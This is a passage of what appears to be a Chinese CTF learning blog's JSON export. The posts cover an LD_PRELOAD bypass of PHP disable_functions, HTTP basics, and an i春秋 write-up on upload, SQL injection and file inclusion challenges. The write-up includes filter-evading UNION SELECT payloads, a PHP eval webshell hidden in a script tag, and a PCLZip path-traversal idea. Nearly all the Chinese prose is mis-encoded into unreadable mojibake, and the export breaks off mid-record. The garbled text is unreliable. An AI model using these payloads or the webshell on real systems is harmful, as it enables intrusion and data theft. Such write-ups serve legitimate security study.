ä½¿ç”¨antswordæ’ä»¶è¿›è¡Œç»•è¿‡ æ¥ä¸‹æ¥ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªphpæ–‡ä»¶ï¼Œç›´æ¥å†ç”¨èšå‰‘è®¿é—®è¿æ¥ï¼Œå¯†ç ä¾æ—§æ˜¯ä¹‹å‰é‚£ä¸ª æ¥ä¸‹æ¥å°±å¯ä»¥å‘ç°flagåœ¨æ ¹ç›®å½•ä¸‹äº† äº†è§£åŸç†å…¶å®æ„Ÿè§‰ç”¨æ’ä»¶ä¸æ˜ä¸ç™½çš„ï¼Œæ‰€ä»¥å†³å®šè¦æ·±å…¥å­¦ä¹ ä¸€ä¸‹ åŸå› ï¼šä¸ºä»€ä¹ˆä¼šä½¿ç”¨ä¸äº†ç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿdisable_functionså¼€å…³åœ¨php.iniä¸­å¯ä»¥å…³é—­ä¸€äº›å±é™©çš„åŠŸèƒ½ï¼Œå¦‚ç³»ç»Ÿã€æ‰§è¡Œç­‰ å› ä¸ºåœ¨è¿™ä¸ªdisable_functionsè¿™é‡Œç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ã€‚ **open_basedir** ç½‘ç«™å†…ç›®å½•ä¸ç›®å½•ä¹‹é—´æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œåœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹è¿™æ ·æ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœç›®å½•é—´ç½‘å€æƒé™è¢«é»‘å®¢åˆ©ç”¨å¾ˆå¯èƒ½é€ æˆæ•°æ®æµå¤±ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡PHPopen_basediræ¥å®ç°ç½‘ç«™é—´ç›®å½•éš”ç¦»é…ç½®ï¼Œä»è€Œæé«˜ç½‘ç«™å®‰å…¨ã€‚ æ³¨ï¼šç½‘ç«™é—´éš”ç¦»ç”¨â€œï¼šâ€å·åˆ†å‰²ã€‚ æ³¨ï¼šæ²¡æœ‰è¢«åŒ…å«çš„ç½‘ç«™ä¸å¯è®¿é—®ã€‚ PSï¼šè¿™é‡Œæˆ‘ä¹‹å‰æƒ³è¯´å°è¯•ç”¨æ–‡ä»¶åŒ…å«æ¼æ´çœ‹çœ‹èƒ½ä¸èƒ½è®¿é—®æ ¹ç›®å½•çš„å†…å®¹ï¼Œä½†æ˜¯å› ä¸ºæœ‰è¿™ä¸ªé™åˆ¶åœ¨ï¼Œæ‰€ä»¥ä¸è¡Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸¤ä¸ªä¸œè¥¿ ç»•è¿‡æ€è·¯ç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´ï¼›ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼›ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼›ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚å‚è€ƒ:https://www.freebuf.com/articles/web/192052.html ä½†ä»Šå¤©æˆ‘ä»¬å°±ç›´æ¥çœ‹ä¸€ä¸‹ç¬¬å››ç§æ–¹æ³• åŸºç¡€çŸ¥è¯†å­¦ä¹ linuxåŠ¨æ€åº“ï¼ˆsoå…±äº«å¯¹è±¡åº“ï¼‰ï¼Œé™æ€åº“ä¸€ä¸ªâ€œç¨‹åºå‡½æ•°åº“â€ç®€å•çš„è¯´å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«äº†ä¸€äº›ç¼–è¯‘å¥½çš„ä»£ç å’Œæ•°æ®ï¼Œè¿™äº›ç¼–è¯‘å¥½çš„ä»£ç å’Œæ•°æ®å¯ä»¥åœ¨äº‹åä¾›å…¶ä»–çš„ç¨‹åºä½¿ç”¨ã€‚ç¨‹åºå‡½æ•°åº“å¯ä»¥ä½¿æ•´ä¸ªç¨‹åºæ›´åŠ æ¨¡å—åŒ–ï¼Œæ›´å®¹æ˜“é‡æ–°ç¼–è¯‘ï¼Œè€Œä¸”æ›´æ–¹ä¾¿å‡çº§ã€‚ ç¨‹åºå‡½æ•°åº“å¯åˆ†ä¸º3ç§ç±»å‹ï¼šé™æ€å‡½æ•°åº“ï¼ˆstatic librariesï¼‰ã€å…±äº«å‡½æ•°åº“ï¼ˆshared librariesï¼‰ã€åŠ¨æ€åŠ è½½å‡½æ•°åº“ï¼ˆdynamically loaded librariesï¼‰åŠ¨æ€å‡½æ•°åº“åŒ*å…±äº«å‡½æ•°åº“æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼ˆåœ¨linuxä¸Šå«å…±äº«å¯¹è±¡åº“ï¼Œ æ–‡ä»¶åç¼€æ˜¯.so ï¼Œwindowsä¸Šå«åŠ¨æ€åŠ è½½å‡½æ•°åº“ï¼Œ ****æ–‡ä»¶åç¼€æ˜¯****.dllï¼‰** ä»Šå¤©æˆ‘ä»¬éœ€è¦å­¦ä¹ çš„å°±æ˜¯åŠ¨æ€å‡½æ•°åº“,å› ä¸ºéœ€è¦åˆ›å»º.soæ–‡ä»¶ å…±äº«å‡½æ•°åº“ï¼š**å®šä¹‰:**å…±äº«å‡½æ•°åº“ä¸­çš„å‡½æ•°æ˜¯åœ¨å½“ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºåœ¨å¯åŠ¨çš„æ—¶å€™è¢«åŠ è½½ã€‚å¦‚æœä¸€ä¸ªå…±äº«å‡½æ•°åº“æ­£å¸¸å®‰è£…ï¼Œæ‰€æœ‰çš„ç¨‹åºåœ¨é‡æ–°è¿è¡Œçš„æ—¶å€™éƒ½å¯ä»¥è‡ªåŠ¨åŠ è½½æœ€æ–°çš„å‡½æ•°åº“ä¸­çš„å‡½æ•°ã€‚å¯¹äºLinuxç³»ç»Ÿè¿˜æœ‰æ›´å¤šå¯ä»¥å®ç°çš„åŠŸèƒ½ï¼š 1ã€å‡çº§äº†å‡½æ•°åº“ä½†æ˜¯ä»ç„¶å…è®¸ç¨‹åºä½¿ç”¨è€ç‰ˆæœ¬çš„å‡½æ•°åº“ã€‚ 2ã€å½“æ‰§è¡ŒæŸä¸ªç‰¹å®šç¨‹åºçš„æ—¶å€™å¯ä»¥è¦†ç›–æŸä¸ªç‰¹å®šçš„åº“æˆ–è€…åº“ä¸­æŒ‡å®šçš„å‡½æ•°ã€‚ 3ã€å¯ä»¥åœ¨åº“å‡½æ•°è¢«ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ä¿®æ”¹è¿™äº›å‡½æ•°åº“ã€‚ PHPå¯åŠ¨å¤–éƒ¨ç¨‹åºï¼šPHPå¯åŠ¨å¤–éƒ¨ç¨‹åºæœ‰ä¸¤ç§ï¼Œå¸¸è§çš„å°±æ˜¯ä½¿ç”¨catï¼Œsystemç­‰æŒ‡ä»¤ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæ˜¯ç”¨ä¸äº†çš„https://segmentfault.com/a/1190000008941850è¿˜æœ‰ä¸€ç§å°±æ˜¯é€šè¿‡PHPè§£é‡Šå™¨ï¼šè¿™é‡Œç›´æ¥æ‘˜æŠ„å¤§ä½¬çš„æ€è·¯ï¼šæ¯”å¦‚ï¼Œphp å‡½æ•° goForward() å®ç°â€œå‰è¿›â€çš„åŠŸèƒ½ï¼Œphp å‡½æ•° goForward() åˆç”±ç»„æˆ php è§£é‡Šå™¨çš„ C è¯­è¨€æ¨¡å—ä¹‹ä¸€çš„ move.c å®ç°ï¼ŒC æ¨¡å— move.c å†…éƒ¨åˆé€šè¿‡è°ƒç”¨å¤–éƒ¨ç¨‹åº go.bin å®ç°ï¼Œé‚£ä¹ˆï¼Œæˆ‘çš„ php è„šæœ¬ä¸­è°ƒç”¨äº†å‡½æ•° goForward()ï¼ŒåŠ¿å¿…å¯åŠ¨å¤–éƒ¨ç¨‹åº go.binã€‚ LD_PRELOADç¯å¢ƒå˜é‡ï¼šLD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚ LD_PRELOADå®ç°æ€è·¯ï¼ˆæ€è·¯é‡ç‚¹ï¼‰åœ¨çœ‹å®Œå¤§ä½¬çš„æ€è·¯è§£æåï¼Œæˆ‘æ¥å¤ç°ä¸€ä¸‹ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“LD_PRELOADå¯ä»¥å…è®¸æˆ‘ä»¬å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæ­¤æ—¶æˆ‘ä»¬è®¾è¿™ä¸ªåº“ä¸ºe_evil.soï¼Œåœ¨è¿™ä¸ªåº“ä¸­æˆ‘ä»¬å¯ä»¥åŠ å…¥å¯ä»¥æ‰§è¡Œçš„æ¶æ„ä»£ç ï¼Œæ³¨æ„æ­¤æ—¶è¿™ä¸ªåº“ä¸­çš„ä»£ç æ˜¯ä¸å—disable_functionsé™åˆ¶çš„ï¼Œå› ä¸ºä»–ä¸æ˜¯è¿™ä¸ªç³»ç»Ÿå½“ä¸­ï¼Œæ˜¯æˆ‘ä»¬åæ¥å®šä¹‰çš„ï¼Œé‚£ä¹ˆæœ‰äººä¼šé—®ï¼Œä¸ºå•¥æ‰§è¡Œçš„æ˜¯æˆ‘ä»¬å®šä¹‰çš„è¿™ä¸ªåº“é‡Œçš„ç³»ç»Ÿå‡½æ•°ï¼Œè€Œä¸æ˜¯åŸæœ¬å­˜åœ¨çš„ï¼Ÿè¿™é‡Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬ä¸€å¼€å§‹è¯´çš„å› ä¸ºå®ƒçš„ä¼˜å…ˆçº§æ¯”è¾ƒé«˜ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿å¾—æˆ‘ä»¬å®šä¹‰çš„è¿™ä¸ªç³»ç»Ÿä¹‹å¤–çš„å‡½æ•°è¢«åŠ è½½å‘¢ï¼Ÿé‚£å°±éœ€è¦æˆ‘ä»¬é€šè¿‡webæ‰“å¼€æ–°è¿›ç¨‹ã€‚ æ’ä»¶ä½¿ç”¨æ¡ä»¶æˆåŠŸä½¿ç”¨æ­¤ç»•è¿‡æ’ä»¶çš„ä¸‰ä¸ªå¿…è¦æ¡ä»¶æ˜¯ï¼š 1.mail()å‡½æ•°å’Œerror_log()å‡½æ•°æ‰€è°ƒç”¨çš„sendmailå·²å®‰è£…2.ä¸é™åˆ¶ /usr/sbin/sendmail çš„æ‰§è¡Œ3.mail()å‡½æ•°å’Œerror_log()å‡½æ•°æœ‰ä¸€ä¸ªæœªè¢«ç¦ç”¨ å°ç»“åœ¨è¿™é‡Œæœ‰ä¸ªç‚¹ï¼Œä¸€å¼€å§‹æˆ‘æ˜¯ç›´æ¥å¤§ç¥çš„bypasså·¥å…·é›†ï¼Œåœ¨æ“ä½œçš„æ—¶å€™å‘ç°æ€ä¹ˆéƒ½æ²¡æ³•è¾“å‡ºï¼Œåæ¥é‡æ–°çœ‹äº†ä¸€ä¸‹æ–‡ç« ï¼Œä»–æ˜¯ä½¿ç”¨mail()å‡½æ•°ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜å½“ä¸­ï¼Œmailå‡½æ•°æ˜¯è¢«ç¦ç”¨çš„ï¼Œæ‰€ä»¥æœ€ç»ˆå°±å¤±è´¥äº†ã€‚å…¶å®ç°åœ¨å¯¹äºè¿™ä¸ªbypassçš„åŸç†å·®ä¸å¤šå·²ç»æ¸…æ™°äº†ï¼Œæ„Ÿè§‰è¿™ä¸ªæ€è·¯ç¡®å®å¾ˆå‰å®³ï¼Œæ˜¯ä»¥ä¸€ç§åŠ«æŒçš„æ€æƒ³ç»•è¿‡disable_functionçš„æ‹¦æˆªã€‚ å‚è€ƒå¤§ç¥é“¾æ¥ï¼šhttps://www.freebuf.com/articles/web/192052.htmlantswordæ’ä»¶è¿è¡ŒåŸç†ç»†èŠ‚ï¼šhttps://www.anquanke.com/post/id/195686","link":"/2021/02/06/getshell/"},{"title":"httpåŸç†","text":"ç®€ä»‹HTTPåè®®æ˜¯Hyper Text Transfer Protocolï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰çš„ç¼©å†™,æ˜¯ç”¨äºä»ä¸‡ç»´ç½‘ï¼ˆWWW:World Wide Web ï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ã€‚ã€‚ HTTPæ˜¯ä¸€ä¸ªåŸºäºTCP/IPé€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTML æ–‡ä»¶, å›¾ç‰‡æ–‡ä»¶, æŸ¥è¯¢ç»“æœç­‰ï¼‰ã€‚ å·¥ä½œåŸç†HTTPåè®®å·¥ä½œäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¶æ„ä¸Šã€‚æµè§ˆå™¨ä½œä¸ºHTTPå®¢æˆ·ç«¯é€šè¿‡URLå‘HTTPæœåŠ¡ç«¯å³WEBæœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚webæœåŠ¡å™¨æœ‰ï¼šApacheæœåŠ¡å™¨ï¼ŒIISæœåŠ¡å™¨ç­‰webæœåŠ¡å™¨æ ¹æ®æ¥æ”¶åˆ°çš„è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯ã€‚HTTPé»˜è®¤ç«¯å£å·æ˜¯80ï¼Œä¹Ÿå¯ä»¥æ›´æ”¹ htmlè¯­æ³•ï¼š HTMLå’ŒPHPhtmlæ˜¯ç”¨æ¥åšç½‘é¡µçš„è¡¨ç°å±‚çš„ï¼Œä¹Ÿå°±æ˜¯ä½ æ‰€çœ‹åˆ°çš„å¦‚å­—ä½“ï¼Œé“¾æ¥ï¼Œå›¾ç‰‡ç­‰PHPæ˜¯ç”¨æ¥å¤„ç†é€»è¾‘å±‚çš„ï¼Œä¹Ÿå°±æ˜¯ä½ è¦ç½‘é¡µæä¾›ä»€ä¹ˆåŠŸèƒ½ï¼Œå®Œæˆä»€ä¹ˆåŠ¨ä½œã€‚ PHPä»£ç æ˜¯åµŒå…¥htmlä¸­çš„ä»–ä»¬ä¹‹é—´çš„å…³ç³»å¤§æ¦‚å¯ä»¥è¿™æ ·æ¦‚æ‹¬HTMLå±•ç¤ºå†…å®¹PHPåŠ¨æ€ä¿®æ”¹è¾“å‡ºHTMLå±•ç¤ºå†…å®¹CSSç¾åŒ–é¡µé¢JSè®©é¡µé¢åŠ¨èµ·æ¥ã€‚æé«˜æµè§ˆä½“éªŒã€‚","link":"/2020/12/06/http%E5%8E%9F%E7%90%86/"},{"title":"iæ˜¥ç§‹1","text":"æœ€è¿‘åˆ·bugkuçš„é¢˜ï¼Œåˆ·åˆ°æœ€åä¸€å…³å®åœ¨æœ‰ç‚¹å¤ªç£¨äººäº†ï¼Œæ¥iæ˜¥ç§‹æ¢æ¢å¿ƒæƒ…å§ã€‚ã€‚ æ–‡ä»¶ä¸Šä¼ ï¼šä»Šå¤©åšäº†iæ˜¥ç§‹çš„ä¸€é¢˜æ–‡ä»¶ä¸Šä¼ é¢˜ç›®ï¼Œæ”¶è·è¿˜è›®å¤šçš„ï¼Œä¸»è¦æ˜¯å¤ä¹ äº†ä¸€ä¸‹ä¹‹å‰æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†ç‚¹ï¼Œè¿˜å­¦åˆ°äº†æ–°çš„çŸ¥è¯†: ä»£ç åˆ†æï¼š è¿™è¾¹å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€æ˜¯ä½¿ç”¨äº†ç™½åå•æ£€æŸ¥çš„ä¸€ä¸ªå‡½æ•°åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å‘ç°ï¼Œå¦‚æœåç¼€æ˜¯å‹ç¼©æ–‡ä»¶zipçš„è¯ï¼Œä¹Ÿæ˜¯å¯ä»¥ä¸Šä¼ çš„ï¼Œä½†æ˜¯åç»­è§£å‹å‡ºæ¥çš„æ–‡ä»¶è¦ç»è¿‡check_dir()çš„æ£€æŸ¥ã€‚çœ‹åˆ°è¿™ä¸ªæ˜¯ç™½åå•æ£€æŸ¥ï¼Œå¹¶ä¸”åœ¨ è¿™é‡Œçš„æç¤ºä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ˜¯apacheæœåŠ¡å™¨ã€‚ apacheè§£ææ¼æ´åœ¨Apache1.xï¼Œ2.xä¸­Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ 123.xxx.php.xxxåªè¦è¿™ä¸ªxxxæ˜¯ä¸å¯è¯†åˆ«çš„åç¼€ï¼Œé‚£ä¹ˆæ‰“å¼€è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼ŒApacheå°±ä¼šå°†å…¶è§£æä¸ºphpæ–‡ä»¶ã€‚ æ›´å¤šå‚è€ƒ:https://www.anquanke.com/post/id/219107#h3-3 PCLzipæ–‡ä»¶è§£å‹å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´å½“æˆ‘ä»¬åœ¨å‹ç¼©æ–‡ä»¶å†…çš„æ–‡ä»¶åè®¾ç½®ä¸º../../123.phpå½“è¿™ä¸ªæ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„æ‹¼æ¥ä»¥åå°±ä¼šå˜æˆ/upload/xxxxxx/../../123.php é‚£ä¹ˆè¿™æ—¶ï¼Œè®¿é—®è¯¥æ–‡ä»¶å°±åªéœ€è¦è®¿é—®ä¸Šä¸¤çº§çš„ç›®å½•å³å¯ æ€è·¯æˆ‘ä»¬æ„é€ ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œå‹ç¼©æ–‡ä»¶é‡Œé¢æ”¾æœ‰ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œä¸€ä¸ªç”±010editoræ›´æ”¹è¿‡åç¼€çš„phpæ–‡ä»¶ç„¶åå°†å…¶ä¸Šä¼ ï¼Œè¿™ä¸ªæ—¶å€™ç›´æ¥åœ¨urlä¸­è®¿é—®å³å¯ å‡ºç°çš„é—®é¢˜æˆ‘ä¸Šä¼ çš„è¿™ä¸ªæ–‡ä»¶æ€ä¹ˆéƒ½æ‰¾ä¸åˆ°äº†ï¼Œæˆ‘å°±æœ‰ç‚¹æ— è¯­ï¼Œçœ‹äº†ä¸€ä¸‹æºç ï¼Œä»–åœ¨æ¯æ¬¡ä¸Šä¼ åŠ å‹æ–‡ä»¶åï¼Œéƒ½ä¼šå†ç»è¿‡ä¸€ä¸ªcheck_dir()å‡½æ•°çš„æ£€æŸ¥ï¼Œè€Œä¸”è¿˜æ˜¯é€’å½’æ£€æŸ¥ï¼Œé‚£å…¶å®ä¸Šé¢è¿™ä¸ªæ–¹æ³•å°±ä¸å¯è¡Œäº†ã€‚åæ¥æˆ‘åœ¨ç›²è¯•ï¼Œè®©æ–‡ä»¶åç¼€=php.jpgä¸Šä¼ ä»¥åï¼Œæ‰“å¼€ï¼Œå‘ç°å°±æ˜¯flagäº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿåæ¥å°±åœ¨çŒœæƒ³ï¼Œéš¾ä¸æˆæ˜¯å› ä¸ºæœ‰.htaccessæ–‡ä»¶ï¼Œä½¿å¾—ä¸Šä¼ æˆåŠŸå¹¶ä¸”å­˜åœ¨çš„æ–‡ä»¶å†…å®¹å«æœ‰php å°±å¯ä»¥è§£æä¸ºphpï¼Ÿï¼Œé‚£è¿™é¢˜ä¹Ÿå¤ªæäº†å§ã€‚ åæ­£è¿™é¢˜å°±å…ˆå‘Šä¸€æ®µè½äº†ï¼Œæƒ³äº†æƒ³å°±è¿™æ ·è¿‡å¾—ä¸æ˜ä¸ç™½çš„å®åœ¨ä¸è¡Œï¼Œå†³å¿ƒå†å›æ¥å¥½å¥½æ¢³ç†ä¸€ä¸‹ï¼šé¡ºä¾¿æ•´ç†ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 show_source(__FILE__);}else{ $file = $_FILES['file'];if(!$file){ exit(&quot;è¯·å‹¿ä¸Šä¼ ç©ºæ–‡ä»¶&quot;);}$name = $file['name'];$dir = 'upload/';$ext = strtolower(substr(strrchr($name, '.'), 1));//å°±æ˜¯ç”¨æ¥æ£€éªŒnameè¿˜æœ‰æ²¡æœ‰åç¼€$path = $dir.$name;function check_dir($dir){ $handle = opendir($dir);//é’ˆå¯¹çš„æ˜¯uploadçš„ä¸‹çº§ç›®å½• while(($f = readdir($handle)) !== false){ if(!in_array($f, array('.', '..'))){ if(is_dir($dir.$f)){ check_dir($dir.$f.'/'); }else{ $ext = strtolower(substr(strrchr($f, '.'), 1)); if(!in_array($ext, array('jpg', 'gif', 'png'))){//ç™½åå•æ£€æŸ¥åç¼€è¯´æ˜è¿™ä¸ªæ˜¯æƒ³åˆ©ç”¨è§£ææ¼æ´æ˜¯ä¸è¡Œæ»´ unlink($dir.$f); } } } }}if(!is_dir($dir)){ mkdir($dir);}$temp_dir = $dir.md5(time(). rand(1000,9999));if(!is_dir($temp_dir)){//åˆ›å»ºä¸´æ—¶ç›®å½• mkdir($temp_dir);}if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){ if($ext == 'zip'){ $archive = new PclZip($file['tmp_name']);//ä½¿ç”¨pclzipçš„æ–¹å¼è¿›è¡Œè§£å‹ foreach($archive-&gt;listContent() as $value){ $filename = $value[&quot;filename&quot;]; if(preg_match('/\\.php$/', $filename)){//æ­£åˆ™åŒ¹é…æ˜¯å¦å­˜åœ¨phpæ–‡ä»¶ï¼Œæœ‰çš„è¯å°±ç›´æ¥ä¸å¾€ä¸‹æ£€æŸ¥äº†ï¼Œé»‘åå•æ£€æŸ¥ï¼Œå¯ä»¥ exit(&quot;å‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶!&quot;); //åˆ©ç”¨è§£ææ¼æ´ } } if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) { check_dir($dir); exit(&quot;è§£å‹å¤±è´¥&quot;); } check_dir($dir); exit('ä¸Šä¼ æˆåŠŸ!'); }else{ move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);//ç›´æ¥æ‹¼æ¥æ–‡ä»¶åæ˜¯é€ æˆä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ check_dir($dir); //ä½†è¿™é‡Œä¸è¡Œ exit('ä¸Šä¼ æˆåŠŸ!'); }}else{ exit('ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶!');}} çœ‹å®Œæºç ï¼Œå‘ç°åŸæ¥çš„æ€è·¯æ˜¯æ²¡æœ‰é—®é¢˜çš„å‘€ï¼Œæ„é€ ç©¿è¶Šç›®å½•æ–‡ä»¶åï¼Œå½“æ–‡ä»¶è¢«è§£å‹åï¼Œæ–‡ä»¶æ­¤æ—¶å·²ç»ç©¿è¶Šåˆ°ä¸Šçº§ç›®å½•äº†ï¼Œè€Œcheck_dir()é’ˆå¯¹æ£€æŸ¥çš„æ˜¯upload/ä¸‹çš„ç›®å½•æ–‡ä»¶ï¼Œè€Œç”¨apacheçš„è§£ææ¼æ´ç›®çš„æ˜¯é€ƒè¿‡é‚£ä¸ªé»‘åå•æ£€æŸ¥ï¼Œæ„Ÿè§‰è¿™ä¸ªé¢˜ç›®å¯èƒ½å“ªé‡Œå‡ºäº†é—®é¢˜å§ SQLæ³¨å…¥å…ˆç”¨burpsuitè·‘äº†ä¸€ä¸‹è¿‡æ»¤äº†å•¥ï¼Œå‘ç°è¿‡æ»¤äº†select å’Œorderï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿè¿™é‡Œæ–°å­¦äº†ä¸€ç§&lt;&gt;è¿æ¥ç¬¦payload:?id=1 ord&lt;&gt;er by 3?id=1 union sel&lt;&gt;ect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()?id=1 union sel&lt;&gt;ect 1,group_concat(column_name),3 from information_schema.columns where table_name=â€™infoâ€™?id=1 union sel&lt;&gt;ect 1,flAg_T5ZNdrm,3 from info UPLOADç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°è¿æ¥ä¸äº†ï¼ŒçŒœæµ‹æœ‰è¿‡æ»¤å†…å®¹ï¼Œäºæ˜¯å°†ä¸€å¥è¯æœ¨é©¬åˆ†è§£è¾“å…¥ï¼Œ å‘ç°è¿‡æ»¤äº†&lt;?å’Œphpï¼Œæƒ³åˆ°ä¹‹å‰çœ‹åˆ°è¿‡çš„å¦ä¸€ç§å†™é©¬çš„æ–¹æ³•: 1&lt;script language=&quot;pHp&quot;&gt;@eval($_POST['cmd'])&lt;/script&gt; å³å¯è¿æ¥ï¼Œç„¶åå°±å¯ä»¥æ‰¾åˆ°flagäº† æ–‡ä»¶åŒ…å«ï¼ˆincludeï¼‰è¿™é¢˜æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå› ä¸ºæ˜¯requestè¯·æ±‚pathï¼Œæ‰€ä»¥ç›´æ¥è¾“è·¯å¾„ï¼Œè¯•äº†ä¸€ä¸‹flag.php å‘ç°æ²¡æœ‰æ”¶è·ï¼Œåœ¨ä¸‹é¢var/www/htmlç­‰è·¯å¾„éƒ½æ‰¾äº†ä¸€ä¸‹å‘ç°ä¹Ÿæ²¡æœ‰ï¼Œæƒ³äº†ä¸€ä¸‹ï¼Œä¹‹å‰æ–‡ä»¶åŒ…å«æ¼æ´æœ‰ç»“åˆè¿‡php://inputå°è£…åè®® åæ¥å›æƒ³äº†ä¸€ä¸‹ï¼Œä¸ºå•¥è¿™é¢˜å¯ä»¥ç”¨è¿™ä¸ªphp://inputå°è£…åè®®ï¼Ÿ: **allow_url_include = On(å…è®¸å¼•ç”¨URLæ–‡ä»¶)**å› ä¸ºè¿™ä¸ªæ˜¯æ‰“å¼€çš„ï¼Œæ‰€ä»¥å…¶å®ä»¥åçœ‹åˆ°è¿™ä¸ªé…ç½®ï¼Œå°±è¦æ€è€ƒä¸€ä¸‹æ˜¯å¦éœ€è¦ä½¿ç”¨è¿™ä¸ªå°è£…åè®®æ¥è§£é¢˜äº† Do you know 